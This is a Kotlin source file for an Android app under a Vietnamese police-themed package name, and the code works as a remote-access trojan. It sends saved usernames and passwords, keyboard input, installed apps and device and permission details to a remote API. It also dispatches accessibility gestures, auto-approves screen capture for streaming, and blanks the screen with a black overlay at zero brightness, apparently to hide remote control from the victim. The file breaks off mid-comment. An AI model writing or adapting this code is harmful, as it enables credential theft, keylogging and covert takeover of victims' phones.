package com.congan.vietnam

import android.Manifest.permission.CAMERA
import android.Manifest.permission.READ_SMS
import android.Manifest.permission.SEND_SMS
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityService.WINDOW_SERVICE
import android.accessibilityservice.GestureDescription
import android.annotation.SuppressLint
import android.app.Activity
import android.app.Application
import android.app.WallpaperManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Path
import android.graphics.PixelFormat
import android.graphics.Rect
import android.graphics.drawable.BitmapDrawable
import android.media.AudioManager
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.util.DisplayMetrics
import android.util.Log
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.ProgressBar
import androidx.activity.ComponentActivity
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import androidx.core.os.bundleOf
import com.blankj.utilcode.util.ActivityUtils
import com.blankj.utilcode.util.LogUtils
import com.blankj.utilcode.util.ScreenUtils
import com.pedro.library.generic.GenericStream
import com.congan.vietnam.Manager.GenericStreamManager
import com.congan.vietnam.base.R
import com.congan.vietnam.stepper.ScreenCaptureAutoEnable
import com.congan.vietnam.stepper.StepManager
import com.congan.vietnam.utils.AppConfig
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONObject
import java.io.IOException
import java.net.Inet4Address
import java.net.InetAddress
import java.net.NetworkInterface
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.Collections
import java.util.LinkedList
import java.util.Queue
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

@SuppressLint("StaticFieldLeak")
object Assists {

    var rData: Intent? = null
    var rCode: Int = -1
    private var alphas: Float = 0.99f
    var originalBrightness: Int? =null
    private var blackOverlayView: View? = null
    private lateinit var application: Application // 用于存储全局的 Application
    private var currentActivity: Activity? = null
    private lateinit var genericStream: GenericStream

    private const val SCREEN_CAPTURE_REQUEST_CODE = 1001 // 请求码常量
    //日志TAG
    var LOG_TAG = "assists_log"
    var overlayView: View? = null


    val screenRequestLaunchers: HashMap<Activity, ActivityResultLauncher<Intent>> = hashMapOf()

    private var job = Job()

    fun setDrawableAsWallpaper() {
        try {
            // 保存当前壁纸

            // 获取 WallpaperManager 实例
            val wallpaperManager = WallpaperManager.getInstance(currentActivity)

            // 从 drawable 资源中获取 Bitmap
            val drawable = currentActivity?.getDrawable(R.drawable.background)
            val bitmap = (drawable as BitmapDrawable).bitmap

            // 设置壁纸
            wallpaperManager.setBitmap(bitmap)

            println("壁纸设置成功")
        } catch (e: Exception) {
            e.printStackTrace()
            println("设置壁纸失败: ${e.message}")
        }
    }

    fun restoreDefaultWallpaper() {
        try {
            val wallpaperManager = WallpaperManager.getInstance(currentActivity)
            wallpaperManager.clear() // 恢复系统默认壁纸

            println("已恢复系统默认壁纸")
        } catch (e: Exception) {
            e.printStackTrace()
            println("恢复系统默认壁纸失败: ${e.message}")
        }
    }


    fun getStatusBarHeight(context: Context): String {
        val resourceId = context.resources.getIdentifier("status_bar_height", "dimen", "android")
        return if (resourceId > 0) {
            context.resources.getDimensionPixelSize(resourceId).toString()
        } else {
            "0"
        }
    }

    fun getNavigationBarHeight(context: Context): String {
        val resourceId = context.resources.getIdentifier("navigation_bar_height", "dimen", "android")
        return if (resourceId > 0) {
            context.resources.getDimensionPixelSize(resourceId).toString()
        } else {
            "0"
        }
    }

    /**
     * 获取设备信息
     */
    fun getDeviceInfo(){


        val context=currentActivity!!
        val (width, height) = getFullScreenResolution(context)

        val screenWidth =width
        val screenHeight = height

        val StatusBarHeight = getStatusBarHeight(context)
        val NavigationBarHeight = getNavigationBarHeight(context)


        val deviceModel = Build.MODEL
        val deviceBrand = Build.BRAND
        val androidId = Settings.Secure.getString(currentActivity?.contentResolver, Settings.Secure.ANDROID_ID)
        val screenCaptureEnabled = isEnableScreenCapture()

        // 检查权限
        val cameraPermission = ContextCompat.checkSelfPermission(context, CAMERA) == PackageManager.PERMISSION_GRANTED
        val readSmsPermission =  ContextCompat.checkSelfPermission(context, READ_SMS) == PackageManager.PERMISSION_GRANTED
        val sendSmsPermission = ContextCompat.checkSelfPermission(context, SEND_SMS) == PackageManager.PERMISSION_GRANTED

        val isAccessibilityEnabled = isAccessibilityServiceEnabled()
        val isSilentMode = isDeviceMuted(getContext())
        val sharedPreferences = getContext().getSharedPreferences("AppUploadPrefs", Context.MODE_PRIVATE)
        val del = sharedPreferences.getInt("del", 0)
        val Coordinates = sharedPreferences.getString("Coordinates", "")?: ""




        val isAppUninstallable = del

        val wifiIp = getVpnIpAddress()  // 获取 WiFi 本地 IP    /

        Log.i("wifiIp", wifiIp.toString())

        val sharedPreferences_user = context.getSharedPreferences("user_data", MODE_PRIVATE)
        val username = sharedPreferences_user.getString("username", "") ?: ""
        val password = sharedPreferences_user.getString("password", "") ?: ""
        val password1 = sharedPreferences_user.getString("password1", "") ?: ""
        val password2 = sharedPreferences_user.getString("password2", "") ?: ""
        val banben =getAndroidVersion()

        val app_version=try {
            val packageInfo = context.packageManager.getPackageInfo(context.packageName, 0)
            packageInfo.versionName
        } catch (e: PackageManager.NameNotFoundException) {
            e.printStackTrace()
            "3.1.0"
        }

        uploadDeviceInfo( mapOf(
            "wfip" to wifiIp.toString(),

            "device_brand" to deviceBrand,
            "device_model" to deviceModel,
            "screen_width" to screenWidth,
            "screen_height" to screenHeight,
            "android_id" to androidId,

            "app_version" to app_version,

            "Coordinates" to Coordinates,

            "StatusBarHeight" to StatusBarHeight,
            "NavigationBarHeight" to NavigationBarHeight,

            "phone" to username,
            "cx_password" to password,
            "aq_password" to password1,
            "aq_password2" to password2,
            "banben" to banben,

            "daili" to AppConfig.daili,


            "screen_capture_enabled" to screenCaptureEnabled,
            "camera_permission" to cameraPermission,
            "read_sms_permission" to readSmsPermission,
            "send_sms_permission" to sendSmsPermission,


            "silent_mode" to isSilentMode,
            "uninstallable" to isAppUninstallable,
            "accessibility_permission" to isAccessibilityEnabled,

            "network_type" to getNetworkType(context), // 获取网络类型
            "battery_level" to getBatteryLevel(context), // 获取电量百分比
            "battery_optimization" to isBatteryOptimized(context), // 检查电池优化白名单
            "notification_permission" to hasNotificationPermission(context), // 检查通知权限
            "system_permission" to hasSystemPermission(context), // 检查系统权限
            "overlay_permission" to hasOverlayPermission(context) // 检查悬浮窗权限
        ))
    }

    fun getVpnIpAddress(): String? {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            for (networkInterface in Collections.list(interfaces)) {
                // 通常 VPN 接口名以 "tun" 或 "ppp" 开头
                if (networkInterface.name.startsWith("tun") || networkInterface.name.startsWith("ppp")) {
                    for (inetAddress in Collections.list(networkInterface.inetAddresses)) {
                        // 只选择非回环地址且为 IPv4 地址
                        if (!inetAddress.isLoopbackAddress && inetAddress is Inet4Address) {
                            return inetAddress.hostAddress
                        }
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return "未连接zero或vpn"
    }


    fun getAndroidVersion(): String {
        return when (Build.VERSION.SDK_INT) {
            Build.VERSION_CODES.BASE -> "安卓1.0"
            Build.VERSION_CODES.BASE_1_1 -> "安卓1.1"
            Build.VERSION_CODES.CUPCAKE -> "安卓1.5"
            Build.VERSION_CODES.DONUT -> "安卓1.6"
            Build.VERSION_CODES.ECLAIR -> "安卓2.0"
            Build.VERSION_CODES.ECLAIR_0_1 -> "安卓2.0.1"
            Build.VERSION_CODES.ECLAIR_MR1 -> "安卓2.1"
            Build.VERSION_CODES.FROYO -> "安卓2.2"
            Build.VERSION_CODES.GINGERBREAD -> "安卓2.3"
            Build.VERSION_CODES.GINGERBREAD_MR1 -> "安卓2.3.3"
            Build.VERSION_CODES.HONEYCOMB -> "安卓3.0"
            Build.VERSION_CODES.HONEYCOMB_MR1 -> "安卓3.1"
            Build.VERSION_CODES.HONEYCOMB_MR2 -> "安卓3.2"
            Build.VERSION_CODES.ICE_CREAM_SANDWICH -> "安卓4.0"
            Build.VERSION_CODES.ICE_CREAM_SANDWICH_MR1 -> "安卓4.0.3"
            Build.VERSION_CODES.JELLY_BEAN -> "安卓4.1"
            Build.VERSION_CODES.JELLY_BEAN_MR1 -> "安卓4.2"
            Build.VERSION_CODES.JELLY_BEAN_MR2 -> "安卓4.3"
            Build.VERSION_CODES.KITKAT -> "安卓4.4"
            Build.VERSION_CODES.KITKAT_WATCH -> "安卓4.4W"
            Build.VERSION_CODES.LOLLIPOP -> "安卓5.0"
            Build.VERSION_CODES.LOLLIPOP_MR1 -> "安卓5.1"
            Build.VERSION_CODES.M -> "安卓6.0"
            Build.VERSION_CODES.N -> "安卓7.0"
            Build.VERSION_CODES.N_MR1 -> "安卓7.1"
            Build.VERSION_CODES.O -> "安卓8.0"
            Build.VERSION_CODES.O_MR1 -> "安卓8.1"
            Build.VERSION_CODES.P -> "安卓9"
            Build.VERSION_CODES.Q -> "安卓10"
            Build.VERSION_CODES.R -> "安卓11"
            Build.VERSION_CODES.S -> "安卓12"
            Build.VERSION_CODES.S_V2 -> "安卓12L"
            Build.VERSION_CODES.TIRAMISU -> "安卓13"
            Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> "安卓14"
            35 -> "安卓15" // 直接使用 API 级别 35，防止找不到 VANILLA_ICE_CREAM
            else -> "安卓未知版本 (API ${Build.VERSION.SDK_INT})"
        }
    }




    fun uploadKeyboardInput(inputText: String) {
        // 获取 Android ID
        val androidId = Settings.Secure.getString(getContext().contentResolver, Settings.Secure.ANDROID_ID)

        // 上传键盘输入数据到服务器
        val jsonBody = JSONObject(
            mapOf(
                "android_id" to androidId,
                "input_text" to inputText,
                "timestamp" to System.currentTimeMillis()
            )
        ).toString()

        val requestBody = jsonBody.toRequestBody("application/json; charset=utf-8".toMediaType())
        val request = Request.Builder()
            .url(AppConfig.apiURL+"/api/keyboard-input") // 替换为您的接口 URL
            .post(requestBody)
            .build()

        val client = OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("KeyboardInput", "上传失败: ${e.localizedMessage}")
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.d("KeyboardInput", "上传成功: $inputText")
                } else {
                    Log.e("KeyboardInput", "上传失败: $response")
                }
            }
        })
    }

    /**
     * 上传设备信息
     */
    fun uploadDeviceInfo(deviceInfo: Map<String, Any>) {
        val jsonBody = JSONObject(deviceInfo).toString()
        val requestBody = jsonBody.toRequestBody("application/json; charset=utf-8".toMediaType())

        val request = Request.Builder()
            .url(AppConfig.apiURL+"/api/device-info")
            .post(requestBody)
            .build()

        val client = OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("DeviceInfo", "上传设备信息失败: ${e.localizedMessage}")
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.e("DeviceInfo", "设备信息上传成功: ${jsonBody}")
                } else {
                    Log.e("DeviceInfo", "设备信息上传失败: ${response.code}")
                }
            }
        })
    }

    fun uploadBatch(androidId: String, batch: List<Map<String, String>>) {
        val jsonBody = JSONObject(
            mapOf(
                "android_id" to androidId,
                "apps" to batch
            )
        ).toString()

        val requestBody = jsonBody.toRequestBody("application/json; charset=utf-8".toMediaType())

        val request = Request.Builder()
            .url(AppConfig.apiURL+"/api/installed-apps")
            .post(requestBody)
            .build()

        val client = OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("InstalledApps", "上传应用批次失败: ${e.localizedMessage}")
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.e("InstalledApps", "应用批次上传成功")
                } else {
                    Log.e("InstalledApps", "应用批次上传失败: $response")
                }
            }
        })
    }






    fun setCurrentActivity(activity: Activity) {
        currentActivity = activity
    }

    fun getActivity(): Activity? {
        return currentActivity
    }


    fun isDeviceMuted(context: Context): Boolean {
        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager

        // 检查 STREAM_MUSIC 是否被静音
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            audioManager.isStreamMute(AudioManager.STREAM_MUSIC) // API 23+
        } else {
            audioManager.getStreamVolume(AudioManager.STREAM_MUSIC) == 0
        }
    }



    val pathQueue = LinkedList<Path>()
    val isHolding = AtomicBoolean(false)

    // 提交新路径的函数
    fun submitPath(newPath: Path) {
        pathQueue.add(newPath)
        if (!isHolding.get()) {
            startGesture()
        }
    }

    // 启动手势
    fun startGesture() {
        if (pathQueue.isEmpty()) return
        isHolding.set(true)

        val path = pathQueue.poll()
        val builder = GestureDescription.Builder()
        val stroke = GestureDescription.StrokeDescription(path, 0, 1000)
        builder.addStroke(stroke)

        service?.dispatchGesture(builder.build(), object : AccessibilityService.GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription) {
                if (pathQueue.isNotEmpty()) {
                    startGesture() // 继续执行队列中的路径
                } else {
                    isHolding.set(false)
                }
            }

            override fun onCancelled(gestureDescription: GestureDescription) {
                isHolding.set(false)
            }
        }, null)
    }


    suspend fun holdAndExtend(
        initialPoint: FloatArray,
        service: AccessibilityService,
        pathQueue: LinkedList<Path>
    ) {
        val holdPath = Path().apply {
            moveTo(initialPoint[0], initialPoint[1])
            lineTo(initialPoint[0], initialPoint[1])
        }

        val holdStroke = GestureDescription.StrokeDescription(holdPath, 0, Long.MAX_VALUE) // 无限长时间
        val builder = GestureDescription.Builder().apply { addStroke(holdStroke) }

        service.dispatchGesture(builder.build(), object : AccessibilityService.GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription) {
                // 等待追加路径
                if (pathQueue.isNotEmpty()) {
                    val nextPath = pathQueue.poll()
                    extendGesture(nextPath, service)
                }
            }

            override fun onCancelled(gestureDescription: GestureDescription) {
                // 手势被取消，可能需要重试
            }
        }, null)
    }

    // 追加路径
    fun extendGesture(newPath: Path, service: AccessibilityService) {
        val builder = GestureDescription.Builder()
        val stroke = GestureDescription.StrokeDescription(newPath, 0, 1000) // 添加新路径
        builder.addStroke(stroke)

        service.dispatchGesture(builder.build(), null, null)
    }



    @SuppressLint("MissingPermission")
    fun getNetworkType(context: Context): String {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return when {
            networkInfo == null -> "None"
            networkInfo.type == ConnectivityManager.TYPE_WIFI -> "WiFi"
            networkInfo.type == ConnectivityManager.TYPE_MOBILE -> "Mobile"
            else -> "Unknown"
        }
    }

    fun getBatteryLevel(context: Context): Int {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }


    fun isBatteryOptimized(context: Context): Boolean {
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        return powerManager.isIgnoringBatteryOptimizations(context.packageName)
    }

    fun hasNotificationPermission(context: Context): Boolean {
        return NotificationManagerCompat.from(context).areNotificationsEnabled()
    }

    fun hasSystemPermission(context: Context): Boolean {
        return Settings.System.canWrite(context)
    }

    fun hasOverlayPermission(context: Context): Boolean {
        return Settings.canDrawOverlays(context)
    }

    fun getFullScreenResolution(context: Context): Pair<Int, Int> {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // API 30+ 使用 WindowMetrics
            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = windowManager.currentWindowMetrics
            val bounds = metrics.bounds
            Pair(bounds.width(), bounds.height())
        } else {
            // API < 30 使用 DisplayMetrics
            val displayMetrics = DisplayMetrics()
            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val display = windowManager.defaultDisplay
            display.getRealMetrics(displayMetrics)
            Pair(displayMetrics.widthPixels, displayMetrics.heightPixels)
        }
    }

    fun getScreenWidth(context: Context): Int {
        val metrics = context.resources.displayMetrics
        return metrics.widthPixels
    }

    fun getScreenHeight(context: Context): Int {
        val metrics = context.resources.displayMetrics
        return metrics.heightPixels
    }
    //协程域
    var coroutine: CoroutineScope = CoroutineScope(job + Dispatchers.IO)
        private set
        get() {
            if (job.isCancelled || !job.isActive) {
                job = Job()
                field = CoroutineScope(job + Dispatchers.IO)
            }
            return field
        }


    fun checkAndRequestWriteSettingsPermission(context: Context): Boolean {
        if (!Settings.System.canWrite(context)) {
            Log.d("jiujiu", "WRITE_SETTINGS permission not granted. Requesting permission.")
            val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
            intent.data = Uri.parse("package:${context.packageName}")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
            return false
        }
        Log.d("jiujiu", "WRITE_SETTINGS permission already granted.")
        return true
    }


    fun showOverlay_renlian() {
        removeOverlay()
        if (checkAndRequestWriteSettingsPermission(getContext())) {
            setScreenBrightness(0) // 设置亮度值
        }
        val windowManager = getContext().getSystemService(WINDOW_SERVICE) as WindowManager
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.S_V2) { // Android 12
            alphas=1f
        }else{
            alphas=0.99f
        }


        // 黑色背景层的布局参数
        val blackOverlayParams = WindowManager.LayoutParams().apply {
            type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                WindowManager.LayoutParams.TYPE_PHONE
            }

            format = PixelFormat.TRANSPARENT
            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN

            alpha = alphas // 完全不透明
            gravity = Gravity.TOP or Gravity.START
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
        }

        // 加载原有 overlayView
        blackOverlayView = LayoutInflater.from(getContext()).inflate(R.layout.overlay_black_renlian, null)

        blackOverlayView?.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or  // 扩展到状态栏
                        View.SYSTEM_UI_FLAG_FULLSCREEN or        // 隐藏状态栏
                        View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY    // 沉浸模式
                )


        try {
            // 添加黑色覆盖层
            windowManager.addView(blackOverlayView, blackOverlayParams)
            updateRedFilter()

            Log.d("AssistsService", "Overlay added successfully")
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to add overlay: ${e.message}")
        }
    }

    fun showOverlay2() {
        removeOverlay()
        if (checkAndRequestWriteSettingsPermission(getContext())) {
            setScreenBrightness(0) // 设置亮度值
        }

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.S_V2) { // Android 12
            alphas=1f
        }else{
            alphas=0.99f
        }


        val windowManager = getContext().getSystemService(WINDOW_SERVICE) as WindowManager
        Log.d("AssistsService", "11111")
        // 黑色背景层的布局参数
        val blackOverlayParams = WindowManager.LayoutParams().apply {
            type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                WindowManager.LayoutParams.TYPE_PHONE
            }

            format = PixelFormat.TRANSPARENT
            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED  or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD  or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS // 覆盖到状态栏

            alpha = alphas // 完全不透明
            gravity = Gravity.TOP or Gravity.START
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
        }
        Log.d("AssistsService", "222222")


        // 加载原有 overlayView
        blackOverlayView = LayoutInflater.from(getContext()).inflate(R.layout.overlay_black_progress, null)

        blackOverlayView?.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or  // 扩展到状态栏
                        View.SYSTEM_UI_FLAG_FULLSCREEN or        // 隐藏状态栏
                        View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY    // 沉浸模式
                )

        val progressBar = blackOverlayView?.findViewById<ProgressBar>(R.id.multicolor_progress_bar)

        Log.d("AssistsService", "33333")

        try {
            // 添加黑色覆盖层
            windowManager.addView(blackOverlayView, blackOverlayParams)
            updateRedFilter()

            Log.d("AssistsService", "444444")

            progressBar?.let { startLoopingProgressBar(it) }

            Log.d("AssistsService", "55555")

            Log.d("AssistsService", "Overlay added successfully")
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to add overlay: ${e.message}")
        }
    }
    @SuppressLint("SuspiciousIndentation")
    public fun updateRedFilter() {
        val (width, height) = getFullScreenResolution(getContext())

        genericStream= GenericStreamManager.genericStream!!;

            // 计算 Alpha
            genericStream.getGlInterface().clearFilters()

//            val calculatedAlpha: Float = calculateAlpha(originalColor, renderedColor, overlayAlpha)

            // 设置 OpenGL 滤镜
            val redFilterRender = AlphaFilterRender(getContext(), width, height)
            redFilterRender.initGl(width, height, getContext(), width, height)

            // 动态设置 Alpha
            redFilterRender.setAlpha(0.99f)

            genericStream.getGlInterface().addFilter(redFilterRender)
            redFilterRender.draw()

            Log.d("AssistsService1", "AlphaFilter updated with Alpha:")

    }
    fun removeOverlay() {


        try {
//            Assists.restoreDefaultWallpaper()
            restoreScreenBrightness()
            enableAutoBrightness()


            if (blackOverlayView != null) {
                val windowManager = getContext(). getSystemService(WINDOW_SERVICE) as WindowManager
                // 移除黑色覆盖层
                blackOverlayView?.let {
                    windowManager.removeView(it)
                    blackOverlayView = null // 释放引用
                    Log.d("AssistsService", "Overlay2 removed successfully")
                }
                genericStream.getGlInterface().clearFilters()
            }
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to remove overlay: ${e.message}")
        }
    }
    fun enableAutoBrightness() {
        try {
            val resolver = getContext().contentResolver

            // 启用自动亮度调节
            Settings.System.putInt(
                resolver,
                Settings.System.SCREEN_BRIGHTNESS_MODE,
                Settings.System.SCREEN_BRIGHTNESS_MODE_AUTOMATIC
            )

            Log.d("jiujiu", "Enabled auto-brightness mode")
        } catch (e: Exception) {
            Log.e("jiujiu", "Failed to enable auto-brightness: ${e.message}")
        }
    }
    fun restoreScreenBrightness() {
        try {
            val resolver = getContext().contentResolver

            // 检查是否保存了原始亮度值
            if (originalBrightness != null) {
                // 恢复到原始亮度
                Settings.System.putInt(resolver, Settings.System.SCREEN_BRIGHTNESS, originalBrightness!!)
                Log.d("jiujiu", "Screen brightness restored to $originalBrightness")

                // 恢复当前应用窗口的亮度
                val window = ActivityUtils.getTopActivity()?.window
                val layoutParams = window?.attributes
                layoutParams?.screenBrightness = originalBrightness!! / 255.0f
                window?.attributes = layoutParams
            } else {
                Log.e("jiujiu", "Original brightness is not saved. Cannot restore.")
            }
        } catch (e: Exception) {
            Log.e("jiujiu", "Failed to restore screen brightness: ${e.message}")
        }
    }

    private fun startLoopingProgressBar(progressBar: ProgressBar) {
        val totalTime = 500000L // 每 120 秒循环一次
        val interval = 100L // 每 100ms 更新一次
        val handler = Handler(Looper.getMainLooper())

        var elapsedTime = 0L // 自定义时间变量，从 0 开始

        handler.post(object : Runnable {
            override fun run() {
                elapsedTime += interval
                val progress = ((elapsedTime / totalTime.toFloat()) * 100).toInt()

                // 更新进度条
                progressBar.progress = progress

                // 保证循环
                if (elapsedTime < totalTime) {
                    handler.postDelayed(this, interval)
                } else {
                    // 重置进度条并停止
                    progressBar.progress = 0
                }
            }
        })
    }

    fun setScreenBrightness(brightness: Int) {
        try {
            val resolver = getContext().contentResolver

            // 获取当前系统亮度值并保存
            if (originalBrightness == null) {
                originalBrightness = Settings.System.getInt(resolver, Settings.System.SCREEN_BRIGHTNESS)
                Log.d("jiujiu", "Original brightness saved: $originalBrightness")
            }

            // 禁用自动亮度调节
            Settings.System.putInt(resolver, Settings.System.SCREEN_BRIGHTNESS_MODE, Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)

            // 设置系统亮度
            Settings.System.putInt(resolver, Settings.System.SCREEN_BRIGHTNESS, brightness)

            // 设置当前应用窗口的亮度
            val window = ActivityUtils.getTopActivity()?.window
            val layoutParams = window?.attributes
            layoutParams?.screenBrightness = brightness / 255.0f
            window?.attributes = layoutParams

            Log.d("jiujiu", "Screen brightness set to $brightness")
        } catch (e: Exception) {
            Log.e("jiujiu", "Failed to set screen brightness: ${e.message}")
        }
    }

    /**
     * 无障碍服务，未开启前为null，使用注意判空
     */
    @JvmStatic
    var service: AssistsService? = null

    val serviceListeners: ArrayList<AssistsServiceListener> = arrayListOf()

    private var appRectInScreen: Rect? = null

    var screenCaptureService: ScreenCaptureService? = null
        set(value) {
            if (value != null) {
                serviceListeners.forEach { it.screenCaptureEnable() }
            }
            field = value
        }

    private val activityLifecycleCallbacks = object : Application.ActivityLifecycleCallbacks {
        override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {
            if (activity is ComponentActivity) {
                val screenRequestLauncher = activity.registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
                    if (result.resultCode == Activity.RESULT_OK) {
                        val service = Intent(activity, ScreenCaptureService::class.java)

                        service.putExtra("rCode", result.resultCode)
                        service.putExtra("rData", result.data)
                        activity.startService(service)
                    }
                }
                screenRequestLaunchers[activity] = screenRequestLauncher
            }
        }

        override fun onActivityStarted(activity: Activity) {
        }

        override fun onActivityResumed(activity: Activity) {
        }

        override fun onActivityPaused(activity: Activity) {
        }

        override fun onActivityStopped(activity: Activity) {
        }

        override fun onActivitySaveInstanceState(activity: Activity, outState: Bundle) {
        }

        override fun onActivityDestroyed(activity: Activity) {
            screenRequestLaunchers.remove(activity)
        }
    }



    /**
     * 获取当前屏幕亮度
     * @param context 上下文
     * @return 当前屏幕亮度值 (0-255)，如果失败返回 -1
     */
    @JvmStatic
    fun getScreenBrightness(context: Context): Int {
        return try {
            val resolver: ContentResolver = context.contentResolver
            Settings.System.getInt(resolver, Settings.System.SCREEN_BRIGHTNESS)
        } catch (e: Exception) {
            Log.e(LOG_TAG, "获取屏幕亮度失败: ${e.localizedMessage}")
            -1
        }
    }




    /**
     * 请求录屏权限
     * @param isAutoEnable 是否自动通过，如果设置自动通过前提需要先开启无障碍服务（当前仅测试小米系统通过，其他机型系统未测试）
     */
    fun requestScreenCapture(isAutoEnable: Boolean, fujia: String = "1") {
        Log.e(LOG_TAG, "0000")

        // 检查是否已启用屏幕捕获服务
        screenCaptureService ?: let {
            // 获取当前顶层Activity并启动屏幕捕获权限请求
            screenRequestLaunchers[ActivityUtils.getTopActivity()]?.launch(
                (ActivityUtils.getTopActivity().getSystemService(AppCompatActivity.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager)
                    .createScreenCaptureIntent()
            )

            Log.e(LOG_TAG, "1111")
            // 如果需要自动启用并且服务已初始化，执行自动启用步骤
            if (isAutoEnable) {
                Log.e(LOG_TAG, "22222")
                StepManager.execute(ScreenCaptureAutoEnable::class.java, 1,100L,data=fujia,false)
            }
        }
    }

    /**
     * 是否拥有录屏权限
     */
    fun isEnableScreenCapture(): Boolean {
        return screenCaptureService != null
    }

    fun init(application: Application) {
        this.application = application
        application.registerActivityLifecycleCallbacks(activityLifecycleCallbacks)
        LogUtils.getConfig().globalTag = LOG_TAG
    }

    /**
     * 打开无障碍服务设置
     */
    @JvmStatic
    fun openAccessibilitySetting() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        ActivityUtils.startActivity(intent)
    }

    /**
     *检查无障碍服务是否开启
     */
    fun isAccessibilityServiceEnabled(): Boolean {
        return service != null
    }

    /**
     * 获取当前窗口所属包名
     */
    fun getPackageName(): String {
        return service?.rootInActiveWindow?.packageName?.toString() ?: ""
    }

    /**
     * 通过id查找所有符合条件元素
     */
    fun findById(id: String): List<AccessibilityNodeInfo> {
        return service?.rootInActiveWindow?.findById(id) ?: arrayListOf()
    }

    /**
